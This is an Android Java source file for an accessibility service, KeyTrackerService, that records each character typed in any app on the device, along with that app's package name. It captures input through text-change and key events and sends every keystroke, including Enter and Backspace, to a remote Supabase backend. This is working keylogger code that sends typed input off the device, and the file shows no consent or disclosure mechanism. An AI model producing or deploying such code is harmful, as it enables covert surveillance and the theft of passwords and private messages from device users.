package com.andtracker;

import android.accessibilityservice.AccessibilityService;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import android.view.KeyEvent;
import java.util.List;

public class KeyTrackerService extends AccessibilityService {
    private static final String TAG = "KeyTrackerService";
    private static volatile KeyTrackerService INSTANCE;

    private Handler mainHandler;
    private volatile String lastPackageName = null;

    public static KeyTrackerService getInstance() {
        return INSTANCE;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        if (event.getPackageName() != null) {
            lastPackageName = event.getPackageName().toString();
        }

        // Capturer les événements de changement de texte
        // IMPORTANT: ne pas traiter TYPE_VIEW_TEXT_SELECTION_CHANGED ici, sinon on duplique souvent
        // (beaucoup d’IME déclenchent selection_changed juste après chaque caractère)
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence beforeText = event.getBeforeText();
            // event.getText() returns a List<CharSequence>
            List<CharSequence> texts = event.getText();
            CharSequence text = null;
            if (texts != null && !texts.isEmpty()) {
                // In practice, the first item is the current text of the view.
                text = texts.get(0);
            }

            if (Log.isLoggable(TAG, Log.DEBUG)) {
                Log.d(TAG, "A11y event type=" + event.getEventType()
                        + " pkg=" + event.getPackageName()
                        + " cls=" + event.getClassName()
                        + " before=" + (beforeText == null ? "null" : "\"" + beforeText + "\"")
                        + " text=" + (text == null ? "null" : "\"" + text + "\""));
            }
            
            if (text != null && text.length() > 0) {
                // Preferred: use event indices/counts (more reliable than beforeText diffs)
                int fromIndex = event.getFromIndex();
                int addedCount = event.getAddedCount();

                if (fromIndex >= 0 && addedCount > 0 && fromIndex + addedCount <= text.length()) {
                    String added = text.subSequence(fromIndex, fromIndex + addedCount).toString();
                    for (int i = 0; i < added.length(); i++) {
                        sendKeyToSupabase("pressed_key", String.valueOf(added.charAt(i)), lastPackageName);
                    }
                    return;
                }

                // Fallback: naive diff using beforeText
                if (beforeText != null && beforeText.length() > 0) {
                    int beforeLength = beforeText.length();
                    int currentLength = text.length();
                    if (currentLength > beforeLength) {
                        String newChars = text.subSequence(beforeLength, currentLength).toString();
                        for (int i = 0; i < newChars.length(); i++) {
                            sendKeyToSupabase("pressed_key", String.valueOf(newChars.charAt(i)), lastPackageName);
                        }
                    }
                } else if (text.length() > 0) {
                    // Last resort: send last character
                    sendKeyToSupabase("pressed_key", String.valueOf(text.charAt(text.length() - 1)), lastPackageName);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (event == null) return super.onKeyEvent(null);

        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            int unicode = event.getUnicodeChar();
            if (unicode != 0) {
                String key = String.valueOf((char) unicode);
                Log.d(TAG, "KeyEvent unicode=" + unicode + " key=\"" + key + "\"");
                sendKeyToSupabase("pressed_key", key, lastPackageName);
            } else {
                // Handle common non-unicode keys
                int code = event.getKeyCode();
                if (code == KeyEvent.KEYCODE_ENTER) {
                    Log.d(TAG, "KeyEvent ENTER");
                    sendKeyToSupabase("pressed_key", "\n", lastPackageName);
                } else if (code == KeyEvent.KEYCODE_DEL) {
                    Log.d(TAG, "KeyEvent BACKSPACE");
                    sendKeyToSupabase("pressed_key", "[BACKSPACE]", lastPackageName);
                } else if (code == KeyEvent.KEYCODE_SPACE) {
                    Log.d(TAG, "KeyEvent SPACE");
                    sendKeyToSupabase("pressed_key", " ", lastPackageName);
                }
            }
        }

        return super.onKeyEvent(event);
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        INSTANCE = this;
        mainHandler = new Handler(Looper.getMainLooper());
        Log.d(TAG, "Accessibility service connected. Supabase URL configured=" +
                (BuildConfig.SUPABASE_URL != null && !BuildConfig.SUPABASE_URL.isEmpty()));
    }

    @Override
    public void onDestroy() {
        if (INSTANCE == this) {
            INSTANCE = null;
        }
        super.onDestroy();
    }













    private void sendKeyToSupabase(String eventType, String eventValue, String packageName) {
        SupabaseAndroidEventsClient.sendEvent(
                this,
                packageName,
                eventType,
                eventValue
        );
    }
}
